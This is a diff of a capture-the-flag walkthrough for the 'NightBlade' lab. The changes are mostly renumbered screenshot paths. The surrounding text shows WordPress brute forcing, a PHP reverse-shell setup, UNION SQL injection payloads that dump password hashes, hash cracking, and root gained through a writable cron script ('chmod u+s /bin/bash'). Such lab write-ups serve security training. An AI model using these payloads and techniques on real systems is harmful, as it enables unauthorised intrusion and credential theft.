@@ -1,4 +1,3 @@
-# NightBlade
 
 ## Enumeration
 
@@ -8,7 +7,7 @@ We start by enumerating the ports on the target machine using **scapot**, a port
 scapot -t 172.18.0.2 -m top -b
 ```
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng1.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng.png" style="max-width:100%; border-radius:8px;">
 
 The result shows that only port **80/TCP** is open, which is being used by the **Apache HTTP Server**.
 
@@ -41,7 +40,7 @@ MAC Address: 3E:7A:10:9F:B9:29 (Unknown)
 
 The result reveals relevant information: the page title is **NightBlade Gaming — Terminal**. The `robots.txt` file exposes two entries: `/wp/wp-admin/`, which confirms the presence of a **WordPress** installation at the `/wp` path, and the string `4c334d7a5933497a6445417662476c7a644335306558513d0a`, which appears to be encoded, possibly in **hexadecimal**. We proceed to review the web server for more information.
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng2.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng3.png" style="max-width:100%; border-radius:8px;">
 
 When interacting with the web terminal page, we find a hint: **[ERRNO 13] Permission denied — Hint: check the server rules, and remember not everything is in plain text**. This confirms that there is encoded content.
 
@@ -96,7 +95,7 @@ echo "4c334d7a5933497a6445417662476c7a644335306558513d0a" | xxd -r -p
 echo "4c334d7a5933497a6445417662476c7a644335306558513d0a" | xxd -r -p | base64 -d
 ```
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng3.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng4.png" style="max-width:100%; border-radius:8px;">
 
 We download the file to our machine using **curl**:
 
@@ -131,7 +130,7 @@ We confirm that the file is a **custom wordlist** that we will use later to perf
 
 Before using WPScan, we enumerate the blog author directly from the browser by visiting `http://172.18.0.2/wp/?author=1`, which reveals that the author of the posts is **krav0**. We now have a valid username to use in a brute force attack.
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng4.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng5.png" style="max-width:100%; border-radius:8px;">
 
 We proceed to confirm the user and gather more information with **WPScan**:
 
@@ -167,7 +166,7 @@ With the username `krav0` and the custom wordlist `list.txt` downloaded earlier,
 forceweb -u http://172.18.0.2/wp/wp-login.php -w list.txt --usuario krav0 -f "The password you entered for the username" -p log -P pwd
 ```
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng5.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng6.png" style="max-width:100%; border-radius:8px;">
 
 > We perform the brute force attack against the WordPress login panel using **forceweb**, a web form brute force tool built in Rust, developed by me and available on my GitHub repository.
 
@@ -203,7 +202,7 @@ $port = 1234;
 
 We update the file by clicking **"Update File"**.
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng6.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng7.png" style="max-width:100%; border-radius:8px;">
 
 Next, we set up a listener with `rustcat`:
 
@@ -221,7 +220,7 @@ This automatically redirects to the `404.php` template, executing our reverse sh
 
 We receive the connection on our listener:
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng7.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng8.png" style="max-width:100%; border-radius:8px;">
 
 ---
 
@@ -339,7 +338,7 @@ grep user1 /etc/passwd
 
 **Authenticate as the new user:**
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng8.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng9.png" style="max-width:100%; border-radius:8px;">
 
 | Field | Value | Description |
 |---|---|---|
@@ -481,7 +480,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 No additional relevant information was found.
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng9.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng10.png" style="max-width:100%; border-radius:8px;">
 
 > You can configure FoxyProxy or browser proxies to access the internal network, or do it from the terminal with **proxychains firefox 10.10.10.3**.
 
@@ -500,11 +499,11 @@ We enumerate accessible directories:
 
 We find an `index.php`.
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng10.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng11.png" style="max-width:100%; border-radius:8px;">
 
 We observe that the web application is connected to an internal database.
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng11.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng12.png" style="max-width:100%; border-radius:8px;">
 
 ---
 
@@ -516,7 +515,7 @@ Since the web application uses a database, we proceed to test for UNION-based SQ
 ' UNION SELECT 1,2,3,4-- -
 ```
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng12.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng13.png" style="max-width:100%; border-radius:8px;">
 
 We confirm that the database returns 4 columns. When trying with 5 columns we get an error, indicating there are no additional columns.
 
@@ -538,7 +537,7 @@ With the version identified, we enumerate the available databases:
 ' UNION SELECT 1,2,schema_name,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
 ```
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng13.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng14.png" style="max-width:100%; border-radius:8px;">
 
 We observe that, in addition to the server's default databases, there is one called **nightblade_internal**. To confirm it is the one used by the web application, we run:
 
@@ -546,7 +545,7 @@ We observe that, in addition to the server's default databases, there is one cal
 ' UNION SELECT 1,2,database(),4-- -
 ```
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng14.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng15.png" style="max-width:100%; border-radius:8px;">
 
 With the database confirmed, we enumerate its tables:
 
@@ -554,7 +553,7 @@ With the database confirmed, we enumerate its tables:
 ' UNION SELECT 1,2,TABLE_NAME,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='nightblade_internal'-- -
 ```
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng15.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng16.png" style="max-width:100%; border-radius:8px;">
 
 We now enumerate the columns to identify which table contains usernames and passwords:
 
@@ -562,7 +561,7 @@ We now enumerate the columns to identify which table contains usernames and pass
 ' UNION SELECT 1,2,COLUMN_NAME,4 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='employees'-- -
 ```
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng16.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng17.png" style="max-width:100%; border-radius:8px;">
 
 We found the table containing users and their password hashes:
 
@@ -570,13 +569,13 @@ We found the table containing users and their password hashes:
 ' UNION SELECT 1,2,username,password_hash FROM nightblade_internal.employees-- -
 ```
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng17.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng18.png" style="max-width:100%; border-radius:8px;">
 
 With the users and their hashes obtained, we use John the Ripper to crack them.
 
 We create the hash list:
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng18.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng19.png" style="max-width:100%; border-radius:8px;">
 
 **John The Ripper:**
 
@@ -590,7 +589,7 @@ voidwalker       (?)
 
 With the cracked passwords and obtained usernames, we build our password list and perform a brute force attack:
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng19.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng20.png" style="max-width:100%; border-radius:8px;">
 
 We connect via SSH:
 
@@ -605,11 +604,11 @@ password: dragon
 
 We run **pspy64** to monitor running processes. First, we transfer it from our attacker machine to the internal host:
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng20.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng21.png" style="max-width:100%; border-radius:8px;">
 
 Once the tool is running, we observe that a `.sh` script is executed as root every minute:
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng21.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng22png" style="max-width:100%; border-radius:8px;">
 
 We verify the script's permissions:
 
@@ -628,7 +627,7 @@ We append the command **`chmod u+s /bin/bash`** to the script to set the SUID bi
 echo 'chmod u+s /bin/bash' >> /opt/scripts/check.sh
 ```
 
-<img src="/budahacksecurity/uploads/md_images/nightblade/ng22.png" style="max-width:100%; border-radius:8px;">
+<img src="/budahacksecurity/uploads/md_images/nightblade/ng23.png" style="max-width:100%; border-radius:8px;">
 
 After waiting for the cronjob to execute, we gain root access:
 
